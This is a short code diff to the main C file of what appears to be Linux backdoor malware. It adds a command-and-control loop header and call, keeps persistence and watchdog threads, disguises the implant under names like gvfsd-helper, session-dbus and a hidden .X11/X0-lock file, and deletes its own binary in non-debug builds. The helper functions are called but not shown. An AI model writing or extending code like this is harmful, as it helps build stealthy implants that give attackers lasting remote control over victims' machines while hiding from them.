@@ -8,6 +8,7 @@
 // custom functions
 #include "utils.h"
 #include "persistence.h"
+#include "c2_loop.h"
 
 int main(int argc, char *argv[]) {
 
@@ -37,24 +38,24 @@ int main(int argc, char *argv[]) {
         create_lock(0);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
         spawn_thread_watchdog(0);
 
+        // forever run session-dbus as a "watchdog process".
         do {
-            // forever run session-dbus as a "watchdog process".
             sleep(10);
         }while(true);
 
     }
-        //daemon(0, 0);  // detach from current console
-        // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
-
-     // creating .X11/X0-lock
+    //daemon(0, 0);  // detach from current console
+    //spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
+    //creating .X11/X0-lock
     create_lock(1);
-        //session-dbus create
+
+     //session-dbus create
     spawn_thread_watchdog(1);
-        // Main C2 goes here?
     c2_loop();
 
     #ifndef DEBUG
     self_delete(argv[0]); //  deleting this binary.
     #endif
+
     return 0;
  }
